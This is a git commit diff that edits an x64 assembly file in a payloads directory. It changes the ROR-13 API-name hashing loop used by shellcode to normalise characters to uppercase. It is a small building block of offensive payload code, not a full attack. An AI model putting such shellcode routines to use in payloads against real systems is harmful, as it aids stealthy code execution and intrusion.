2b7bdd5e11e7cb7e95c752e7b5333dd87f361921
zerosum0x0 <zerosum0x0@gmail.com>
2017-05-01 17:36:47 -0600

    fix hash

--- payloads/x64/src/single/calc_hash.asm
+++ payloads/x64/src/single/calc_hash.asm
@@ -13,7 +13,10 @@ _calc_hash_loop:
   xor eax, eax
   lodsb                                 ; Read in the next byte of the ASCII function name
   ror r9d, 13                           ; Rotate right our hash value
-  or al, 0x20                           ; to lower
+  cmp al, 'a'
+  jl _calc_hash_not_lowercase
+  sub al, 0x20                          ; If so normalise to uppercase
+_calc_hash_not_lowercase:
   add r9d, eax                          ; Add the next byte of the name
   cmp al, ah                            ; Compare AL to AH (\0)
   jne _calc_hash_loop
